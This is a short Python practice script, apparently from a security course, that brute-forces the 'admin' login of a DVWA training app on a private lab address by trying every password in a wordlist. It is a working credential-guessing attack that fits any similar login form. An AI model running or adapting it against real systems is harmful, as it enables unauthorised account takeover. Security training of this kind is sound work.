#!/usr/bin/env python

import mechanize

br = mechanize.Browser()
url = "http://192.168.210.130/dvwa/login.php"
#br.open(url)

wordlist = open('/root/python-practice/module4/forms/passwords.txt','r')
passwords = wordlist.read().splitlines() #splitlines() will convert to a list OR read.split('\n')
#passwords = ["hello","welcome","welldone","comeon","Password","password","Hello123"]

for password in passwords:
    response = br.open(url)
    br.select_form(nr=0)
    br.form['username'] = 'admin'
    br.form['password'] = password
    response = br.submit()
#    if response.geturl() != "http://192.168.210.130/dvwa/login.php":
    if response.geturl() == "http://192.168.210.130/dvwa/index.php":
        print("Password Found: " + password)
        break
